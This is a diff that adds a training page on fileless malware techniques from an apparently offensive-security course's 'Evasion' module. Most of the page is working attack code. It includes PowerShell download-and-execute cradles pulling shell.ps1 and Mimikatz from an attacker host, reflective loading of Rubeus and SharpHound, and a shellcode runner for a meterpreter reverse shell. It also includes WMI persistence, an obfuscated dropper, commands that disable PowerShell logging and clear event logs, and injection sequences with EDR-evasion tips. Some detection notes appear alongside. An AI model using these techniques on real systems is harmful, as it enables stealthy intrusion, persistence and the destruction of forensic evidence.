@@ -1,0 +1,433 @@
+---
+layout: training-page
+title: "Fileless Techniques"
+module: "Evasion"
+tags:
+  - fileless
+  - in-memory
+  - reflective-loading
+  - process-injection
+page_key: "evasion-fileless"
+---
+<h1>Fileless Techniques</h1>
+
+        <h2>What is Fileless Malware</h2>
+        <p>Fileless techniques execute code without writing a PE file to disk. Execution occurs entirely in memory — via PowerShell, WMI, .NET, or injected shellcode. Because there is no binary to scan on disk, file-based AV detection is bypassed. Modern EDR still detects fileless via memory scanning, behavioral analysis, and ETW telemetry — but fileless significantly raises the detection difficulty.</p>
+
+        <div class="diagram-container">
+          <img src="/images/evasion/fileless-chain.svg" alt="Fileless execution chain: phish triggers PowerShell IEX download cradle, shellcode loads into memory, injected into process — nothing touches disk">
+          <div class="diagram-label">// fileless execution chain — from phish to in-memory beacon</div>
+        </div>
+
+        <pre><code>># Fileless execution paths:
+# 1. PowerShell IEX — download and execute script in memory
+# 2. .NET Assembly loading — load compiled assembly from bytes into memory
+# 3. Shellcode injection — allocate memory, write shellcode, execute
+# 4. Process hollowing — hollow out a legit process, inject payload
+# 5. Reflective DLL injection — DLL loads itself from memory
+# 6. WMI execution — use WMI provider to run commands
+# 7. COM-based execution — run code through COM objects
+
+# What "fileless" still leaves on disk:
+# - Registry-based persistence (run keys, COM hijack)
+# - WMI event subscription bodies
+# - Prefetch entries (execution artifacts)
+# - Event logs (PowerShell ScriptBlock logging, AMSI)
+# - Memory forensics can capture running process memory</code></pre>
+
+        <h2>PowerShell In-Memory Execution</h2>
+        <p>The simplest fileless approach: download a script or binary into a variable and execute from memory without writing to disk.</p>
+        <pre><code>># Download and execute script in memory (IEX):
+IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/PowerView.ps1')
+IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/Invoke-Mimikatz.ps1')
+
+# Alias forms (shorter for typed use):
+iex(iwr http://10.10.14.5/shell.ps1 -UseBasicParsing)
+
+# From encoded command (avoids command line logging of full URL):
+$enc = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')"))
+powershell.exe -EncodedCommand $enc
+
+# Bypass execution policy and AMSI in same command:
+powershell.exe -ep bypass -nop -noni -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')"
+# -ep bypass: bypass execution policy
+# -nop: no profile (faster, fewer detection hooks)
+# -noni: non-interactive
+# -w hidden: hidden window
+
+# Download bytes and execute as .NET assembly:
+$bytes = (New-Object Net.WebClient).DownloadData('http://10.10.14.5/Rubeus.exe')
+$asm = [System.Reflection.Assembly]::Load($bytes)
+[Rubeus.Program]::Main(@("kerberoast","/format:hashcat","/outfile:hashes.txt"))</code></pre>
+
+        <h2>Reflective .NET Assembly Loading</h2>
+        <p>Load compiled .NET assemblies from byte arrays without touching disk. The assembly is loaded into the current PowerShell process's memory — no file write, no AppLocker check (for HKCU user-space).</p>
+        <pre><code>># Load from web directly:
+$bytes = (New-Object Net.WebClient).DownloadData('http://10.10.14.5/SharpHound.exe')
+$asm = [System.Reflection.Assembly]::Load($bytes)
+$asm.EntryPoint.Invoke($null, @(,[string[]]@("-c","All","-d","corp.local")))
+
+# Load from base64 string (embed in script):
+$b64 = "TVqQAAMAAAAEAAAA..."  # base64-encoded exe
+$bytes = [Convert]::FromBase64String($b64)
+$asm = [System.Reflection.Assembly]::Load($bytes)
+$asm.EntryPoint.Invoke($null, $null)
+
+# Invoke specific method (not entry point):
+$asm = [System.Reflection.Assembly]::Load($bytes)
+$type = $asm.GetType('Namespace.ClassName')
+$method = $type.GetMethod('MethodName')
+$method.Invoke($null, @("arg1","arg2"))
+
+# Tools commonly loaded this way:
+# - Rubeus.exe
+# - SharpHound.exe
+# - Seatbelt.exe
+# - SharpView.exe
+# - Certify.exe
+# All available as .exe that work when loaded via Assembly::Load</code></pre>
+
+        <h2>Shellcode Injection from PowerShell</h2>
+        <p>Allocate executable memory in a process, write shellcode, and execute it — all from PowerShell via P/Invoke calls to the Win32 API.</p>
+        <pre><code>># Classic PowerShell shellcode runner:
+Add-Type -TypeDefinition @'
+using System;
+using System.Runtime.InteropServices;
+public class Win32 &#123;
+    [DllImport("kernel32")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
+    [DllImport("kernel32")] public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f, IntPtr p, uint c, IntPtr i);
+    [DllImport("kernel32")] public static extern uint WaitForSingleObject(IntPtr h, uint ms);
+&#125;
+'@
+
+# msfvenom shellcode (raw bytes):
+# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f ps1
+[Byte[]] $sc = @(0xfc,0x48,0x83,0xe4,0xf0,...) # truncated
+
+$mem = [Win32]::VirtualAlloc(0, $sc.Length, 0x3000, 0x40)
+# 0x3000 = MEM_COMMIT|MEM_RESERVE
+# 0x40   = PAGE_EXECUTE_READWRITE
+
+[System.Runtime.InteropServices.Marshal]::Copy($sc, 0, $mem, $sc.Length)
+$handle = [Win32]::CreateThread(0, 0, $mem, 0, 0, 0)
+[Win32]::WaitForSingleObject($handle, 0xFFFFFFFF)</code></pre>
+
+        <h2>Process Hollowing</h2>
+        <p>Create a legitimate process in suspended state, replace its executable image with shellcode/payload, then resume. The process appears legitimate in task manager while running attacker code.</p>
+        <pre><code>># Process hollowing flow:
+# 1. CreateProcess() with CREATE_SUSPENDED flag
+# 2. NtUnmapViewOfSection() — unmap the original executable
+# 3. VirtualAllocEx() — allocate memory in the suspended process
+# 4. WriteProcessMemory() — write the payload PE/shellcode
+# 5. SetThreadContext() — update entry point register (RCX/EAX = payload entry point)
+# 6. ResumeThread() — resume execution
+
+# Common host processes to hollow:
+# svchost.exe, notepad.exe, explorer.exe, RuntimeBroker.exe
+
+# C# implementation — concept (not full code):
+Process target = Process.Start(new ProcessStartInfo("C:\\Windows\\System32\\svchost.exe") &#123; CreateNoWindow = true &#125;);
+// Suspend → Unmap → Allocate → Write → SetContext → Resume
+
+# Tools that implement process hollowing:
+# - Cobalt Strike process injection (process-inject command)
+# - Metasploit post/windows/manage/shellcode_inject
+# - Custom C2 implants
+
+# Detection indicators:
+# - Process with legitimate name but unexpected parent
+# - PE image not matching known-good hash
+# - Process with no associated executable on disk (memory-only PE)
+# - CreateProcess + NtUnmapViewOfSection + WriteProcessMemory sequence</code></pre>
+
+        <h2>WMI for Fileless Execution</h2>
+        <p>Windows Management Instrumentation can execute code without spawning a child process visible to the user. WMI subscriptions provide fileless persistence.</p>
+        <pre><code>># Execute command via WMI (no parent-child relationship in process tree):
+$wmi = [wmiclass]"\\.\root\cimv2:Win32_Process"
+$wmi.Create("powershell.exe -ep bypass -nop -c IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')")
+
+# Remote WMI execution:
+Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "notepad.exe" -ComputerName 172.16.5.19 -Credential (Get-Credential)
+
+# WMI event subscription persistence (fileless persistence):
+$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @&#123;
+    Name = "AutoStart"
+    EventNameSpace = "root\cimv2"
+    QueryLanguage = "WQL"
+    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+&#125;
+
+$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @&#123;
+    Name = "AutoStart"
+    CommandLineTemplate = "powershell -ep bypass -nop -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')"
+&#125;
+
+Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @&#123;
+    Filter = $filter
+    Consumer = $consumer
+&#125;</code></pre>
+
+        <h2>DLL Hijacking</h2>
+        <p>DLL hijacking tricks a legitimate process into loading a malicious DLL by placing it earlier in the DLL search order. When the application loads, the malicious DLL executes in the context of the trusted process — no new process spawned, code runs under a signed binary.</p>
+        <pre><code># Windows DLL search order:
+# 1. Directory the application was loaded from
+# 2. System directory (C:\Windows\System32)
+# 3. 16-bit system directory
+# 4. Windows directory (C:\Windows)
+# 5. Current directory
+# 6. Directories in %PATH%
+
+# Find hijackable DLLs (missing DLLs loaded by processes):
+# Tools: Process Monitor (filter on NAME NOT FOUND + .dll)
+# Sysinternals Autoruns → missing entries
+# procmon filter: Result = NAME NOT FOUND, Path ends with .dll
+
+# Identify target DLL exports to forward:
+# The malicious DLL must export the same functions as the real DLL
+# (or the application will crash when it can't find the exports)
+
+# Example: hijacking a DLL loaded from a writable directory
+# 1. Find process loading nonexistent DLL: NisSrv.exe loads MpClient.dll
+# 2. Create malicious DLL exporting required functions + execute payload in DllMain
+# 3. Place in search path before legitimate location
+
+# Find writable directories in PATH:
+foreach ($p in $env:PATH.Split(';')) &#123; if (Test-Path $p) &#123; $acl = Get-Acl $p; Write-Host "$p : $($acl.Access | Where-Object &#123;$_.IdentityReference -match 'Users'&#125; | Select -First 1 -Exp FileSystemRights)" &#125; &#125;
+
+# Compile proxy DLL (forward all original exports + execute payload):
+# dllexport void OriginalFunction() &#123;&#125; // empty stub keeps app happy
+# DllMain: allocate + execute shellcode
+
+# Run application — malicious DLL executes under trusted process context</code></pre>
+
+        <h2>Remote Thread Hijacking</h2>
+        <p>Remote thread hijacking injects shellcode into a running process by suspending one of its threads, redirecting the instruction pointer to shellcode, then resuming. Unlike CreateRemoteThread injection, no new thread is created — the existing thread is redirected, making it harder to detect.</p>
+        <pre><code># Steps:
+# 1. Find target process (e.g., notepad.exe, explorer.exe)
+# 2. OpenProcess(PROCESS_ALL_ACCESS) + OpenThread(THREAD_ALL_ACCESS)
+# 3. VirtualAllocEx() — allocate RWX memory in target process
+# 4. WriteProcessMemory() — write shellcode to allocated region
+# 5. SuspendThread() — pause the target thread
+# 6. GetThreadContext() — read current register state
+# 7. Modify context.Rip (x64) or context.Eip (x86) = shellcode address
+# 8. SetThreadContext() — apply modified context
+# 9. ResumeThread() — execution continues at shellcode
+
+# PowerShell approach using P/Invoke:
+# (Get PID of target process)
+$targetPID = (Get-Process notepad).Id
+
+# Key Win32 calls:
+# OpenProcess(0x1F0FFF, false, targetPID)
+# VirtualAllocEx(hProcess, null, size, 0x3000, 0x40)
+# WriteProcessMemory(hProcess, addr, shellcode, size, out written)
+# OpenThread(0x1F03FF, false, threadId)
+# SuspendThread(hThread)
+# GetThreadContext(hThread, ref ctx)  # ctx.Rip = shellcode addr
+# SetThreadContext(hThread, ref ctx)
+# ResumeThread(hThread)
+
+# OPSEC: target long-running stable threads (avoid threads with locks)
+# Use notepad.exe, explorer.exe, or other stable user processes</code></pre>
+
+        <h2>Fileless Dropper (PowerShell In-Memory)</h2>
+        <p>A fileless dropper downloads and executes a payload entirely in memory without writing to disk. The simplest form uses PowerShell's IEX; more advanced variants use .NET reflection to avoid touching the filesystem at all.</p>
+        <pre><code># Basic fileless dropper — download and IEX:
+$remotePayload = "http://10.10.14.5/shell.ps1"
+$code = (New-Object Net.WebClient).DownloadString($remotePayload)
+IEX $code
+
+# With error handling:
+try &#123;
+    IEX (Invoke-WebRequest -Uri $remotePayload -UseBasicParsing).Content
+&#125; catch &#123; Write-Error "Failed to retrieve payload" &#125;
+
+# Obfuscated form:
+$c='IEX';$u='http://10.10.14.5/shell.ps1'
+& ([scriptblock]::Create("$c ((New-Object Net.WebClient).DownloadString('$u'))"))
+
+# Base64 encoded payload delivery:
+powershell -enc [base64 of IEX download command]
+
+# Load .NET assembly from memory (avoids spawning powershell.exe):
+$bytes = (New-Object Net.WebClient).DownloadData('http://10.10.14.5/tool.exe')
+[System.Reflection.Assembly]::Load($bytes)
+
+# C++ via PowerShell Automation APIs (no powershell.exe process):
+# Create PowerShell runspace from C++, execute script via .NET Automation DLL
+# Payload never touches disk; spawns from host process, not powershell.exe</code></pre>
+
+        <h2>Fileless Artifacts and Logging Bypasses</h2>
+        <pre><code>># Disable PowerShell Script Block Logging:
+# (Requires registry write access)
+Remove-Item "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Recurse -Force
+
+# Disable Module Logging:
+Remove-Item "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Recurse -Force
+
+# Clear PowerShell history:
+Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
+Clear-History
+
+# Clear event logs (requires admin):
+wevtutil cl Microsoft-Windows-PowerShell/Operational
+wevtutil cl Security
+wevtutil cl System
+wevtutil cl Application
+
+# Disable ETW (Event Tracing for Windows) — AMSI + EDR telemetry source:
+# Patch EtwEventWrite in ntdll.dll to return immediately
+# (Similar to AMSI patching — defeats runtime tracing)
+
+# Check what's being logged:
+Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 20</code></pre>
+
+        <h2>APC Injection (Asynchronous Procedure Call)</h2>
+        <p>APC injection queues shellcode to execute inside an existing thread without creating a new thread. This avoids the CreateRemoteThread pattern that EDRs monitor closely. The target thread must enter an alertable wait state (SleepEx, WaitForSingleObjectEx) for the queued APC to execute. Used by Cobalt Strike, Emotet, and QBot.</p>
+        <pre><code># APC injection flow (remote process):
+# 1. Find target process PID (e.g., notepad.exe via CreateToolhelp32Snapshot)
+# 2. OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid)
+# 3. VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+# 4. WriteProcessMemory(hProcess, remoteAddr, shellcode, size, NULL)
+# 5. Find an alertable thread in target process:
+#    CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD) → iterate for threads owned by target PID
+#    OpenThread(THREAD_SET_CONTEXT|THREAD_SUSPEND_RESUME, FALSE, tid)
+# 6. QueueUserAPC((PAPCFUNC)remoteAddr, hThread, NULL)
+#    → shellcode placed in thread's APC queue
+# 7. ResumeThread(hThread) — OR NtAlertResumeThread for stealthier wake
+
+# Key constraint: APC only executes when thread is in alertable state
+# Threads in SleepEx(0, TRUE) or WaitForSingleObjectEx are ideal targets
+# If thread is not alertable, APC stays queued until it enters alertable state
+
+# OPSEC considerations:
+# - Change memory from RWX to RX after WriteProcessMemory (before QueueUserAPC)
+#   VirtualProtectEx(hProcess, remoteAddr, size, PAGE_EXECUTE_READ, &old)
+# - Use NtQueueApcThread (ntdll) instead of QueueUserAPC — fewer Win32-level hooks
+# - Target long-running stable threads; avoid threads that may terminate
+
+# Detection vectors:
+# - EDR hooks on QueueUserAPC, NtQueueApcThread, NtAlertResumeThread
+# - Unbacked executable memory regions with no associated module path
+# - YARA: RWX memory + QueueUserAPC + no CreateRemoteThread in same sequence</code></pre>
+
+        <h2>Early Bird Injection</h2>
+        <p>Early Bird is a variant of APC injection that targets a newly created suspended process before EDR agents have finished attaching hooks. By injecting shellcode and queuing the APC while the process is still suspended, the shellcode executes as part of the very first thread operation — before most security software has instrumented the process. Used by FIN7 and QBot.</p>
+        <pre><code># Early Bird injection flow:
+# 1. CreateProcess(target, CREATE_SUSPENDED) — spawn suspended LOLBin (notepad.exe, svchost.exe)
+#    EDR begins its initialization for the new process but hasn't completed hooking yet
+# 2. VirtualAllocEx(pi.hProcess, NULL, size, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+# 3. WriteProcessMemory(pi.hProcess, remoteAddr, shellcode, size, NULL)
+# 4. QueueUserAPC((PAPCFUNC)remoteAddr, pi.hThread, NULL)
+#    — APC queued to the main (suspended) thread before process ever ran
+# 5. ResumeThread(pi.hThread)
+#    — thread immediately processes the queued APC before reaching WinMain
+#    — shellcode runs before EDR's hooks are active in this process
+
+# Why this works:
+# - At ResumeThread time, most EDRs haven't finished injecting their monitoring DLL
+# - The APC executes before any user code, in a window with minimal coverage
+# - Target process (e.g., notepad.exe) is trusted — unlikely to trigger behavioral flags
+
+# Ideal targets (LOLBins / trusted processes):
+# notepad.exe, werfault.exe, svchost.exe, RuntimeBroker.exe
+
+# OPSEC improvements:
+# - Change PAGE_EXECUTE_READWRITE to PAGE_EXECUTE_READ after writing (before Resume):
+#   VirtualProtectEx(pi.hProcess, remoteAddr, size, PAGE_EXECUTE_READ, &old)
+# - Use NtQueueApcThread directly instead of QueueUserAPC
+# - Use indirect syscall stubs for CreateProcess and VirtualAllocEx calls
+
+# Detection:
+# CreateProcess(CREATE_SUSPENDED) + VirtualAllocEx + WriteProcessMemory + QueueUserAPC
+# This sequence on a suspended process is a strong EDR alert pattern in advanced products</code></pre>
+
+        <h2>PPID Spoofing (Parent Process ID Spoofing)</h2>
+        <p>EDRs correlate suspicious activity via process trees. An unusual parent-child relationship triggers alerts — for example cmd.exe spawning PowerShell which spawns certutil. PPID spoofing manipulates the recorded parent PID so a malicious process appears to have been spawned by a trusted parent (explorer.exe, svchost.exe), hiding it within normal process tree patterns. Used by Cobalt Strike beacons, SharpSploit, FIN7, and APT32.</p>
+        <pre><code># PPID spoofing mechanism:
+# Windows records parent PID as the process that called CreateProcess
+# PROC_THREAD_ATTRIBUTE_PARENT_PROCESS lets you specify a different parent handle
+# The spoofed PPID appears in telemetry, event logs, and EDR process trees
+
+# PPID spoofing flow:
+# 1. Find the desired fake parent (e.g., explorer.exe):
+#    DWORD explorerPid = FindProcessId(L"explorer.exe");
+# 2. Open parent process with PROCESS_CREATE_PROCESS access right:
+#    HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, explorerPid);
+# 3. Build PROC_THREAD_ATTRIBUTE_LIST with parent process handle:
+#    InitializeProcThreadAttributeList(attrList, 1, 0, &attrSize)
+#    UpdateProcThreadAttribute(attrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
+#                             &hParent, sizeof(HANDLE), NULL, NULL)
+# 4. Create target process with EXTENDED_STARTUPINFO_PRESENT flag:
+#    STARTUPINFOEXW si = &#123; sizeof(si) &#125;; si.lpAttributeList = attrList;
+#    CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL,
+#                   FALSE, EXTENDED_STARTUPINFO_PRESENT|CREATE_NO_WINDOW,
+#                   NULL, NULL, &si.StartupInfo, &pi)
+# Result: cmd.exe process tree shows explorer.exe as parent, not the actual spawner
+
+# OPSEC tips:
+# - Match the target process to expected children of the spoofed parent
+#   (explorer.exe legitimately spawns cmd.exe, notepad.exe, browsers)
+# - Combine with command-line spoofing (another PROC_THREAD_ATTRIBUTE) to hide args
+# - Ensure tokens and ACLs align with spoofed parent's privilege level
+# - Avoid using cmd.exe or powershell.exe as targets — use LOLBins instead
+
+# Detection vectors (advanced EDR):
+# - Parent-child path mismatch: explorer.exe spawning unusual command-line args
+# - PROC_THREAD_ATTRIBUTE_PARENT_PROCESS usage is logged by ETW providers
+# - ACL/token elevation mismatch between recorded parent and actual spawner
+# - Time delta anomalies between parent's last activity and child creation</code></pre>
+
+        <h2>Portable Executable Injection — Full WinAPI Sequence</h2>
+        <p>PE injection copies shellcode into a target process's address space and executes it there using <code>CreateRemoteThread</code>. The payload runs under the target process identity, hiding malicious activity under a trusted process name. Using <code>VirtualAllocEx</code> + <code>VirtualProtectEx</code> to separate RW (write phase) from RX (execute phase) avoids the suspicious RWX memory pattern that EDRs flag.</p>
+        <pre><code># WinAPI functions used (P/Invoke declarations needed in C#):
+# CreateProcess       — spawn the target host process (detached, no window)
+# VirtualAllocEx      — allocate RW memory in target process for shellcode
+# WriteProcessMemory  — copy shellcode bytes into the allocated region
+# VirtualProtectEx    — change memory to RX before execution (avoid RWX flag)
+# CreateRemoteThread  — start a new thread in target process at shellcode address
+
+# Memory protection constants:
+# PageReadWrite    = 0x04  (allocate as RW — write shellcode here)
+# PageReadExecute  = 0x20  (change to RX — execute from here)
+# DetachedProcess  = 0x00000008
+# CreateNoWindow   = 0x08000000
+
+# Step-by-step PE injection flow (C#):
+
+# Step 1: Spawn target process suspended (or running — doesn't need suspension for PE inject):
+STARTUPINFO startInfo = new STARTUPINFO();
+PROCESS_INFORMATION procInfo;
+uint flags = DetachedProcess | CreateNoWindow;
+CreateProcess(IntPtr.Zero, "C:\\Windows\\System32\\notepad.exe",
+    IntPtr.Zero, IntPtr.Zero, false, flags,
+    IntPtr.Zero, IntPtr.Zero, ref startInfo, out procInfo);
+
+# Step 2: Allocate RW space in the target process:
+IntPtr lpBaseAddress = VirtualAllocEx(procInfo.hProcess, IntPtr.Zero,
+    (uint)buf.Length, 0x3000, PageReadWrite);
+# 0x3000 = MEM_COMMIT | MEM_RESERVE
+
+# Step 3: Copy shellcode to target process memory:
+IntPtr outSize;
+WriteProcessMemory(procInfo.hProcess, lpBaseAddress, buf, buf.Length, out outSize);
+
+# Step 4: Change memory protection to RX (execute-only, no write):
+uint lpflOldProtect;
+VirtualProtectEx(procInfo.hProcess, lpBaseAddress,
+    (uint)buf.Length, PageReadExecute, out lpflOldProtect);
+
+# Step 5: Create remote thread to execute shellcode in target process:
+IntPtr hThread = CreateRemoteThread(procInfo.hProcess, IntPtr.Zero, 0,
+    lpBaseAddress, IntPtr.Zero, 0, IntPtr.Zero);
+
+# OPSEC notes:
+# - Spawn notepad.exe, werfault.exe, or other innocuous host processes
+# - Use DecachedProcess + CreateNoWindow flags so no window appears
+# - RW→RX transition (never RWX) reduces EDR heuristic score
+# - Combine with AES-encrypted shellcode to defeat any in-memory signature scan
+# - Target process must be same architecture as shellcode (x64 for x64 shellcode)
+
+# Required C# P/Invoke structs (PROCESS_INFORMATION, STARTUPINFO) and
+# DllImport declarations for: CreateProcess, VirtualAllocEx, VirtualProtectEx,
+# WriteProcessMemory, CreateRemoteThread from kernel32.dll</code></pre>
